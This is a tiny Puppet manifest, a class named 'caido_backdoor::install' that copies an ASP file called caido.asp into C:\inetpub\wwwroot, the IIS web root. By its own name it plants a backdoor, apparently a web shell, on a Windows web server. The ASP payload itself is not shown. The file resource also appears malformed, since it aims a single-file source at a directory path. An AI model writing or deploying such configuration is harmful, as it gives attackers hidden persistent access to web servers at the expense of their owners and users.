class caido_backdoor::install {
  file { 'C:\inetpub\wwwroot':
    ensure => present,
    source => 'puppet:///modules/caido_backdoor/caido.asp',
  }
}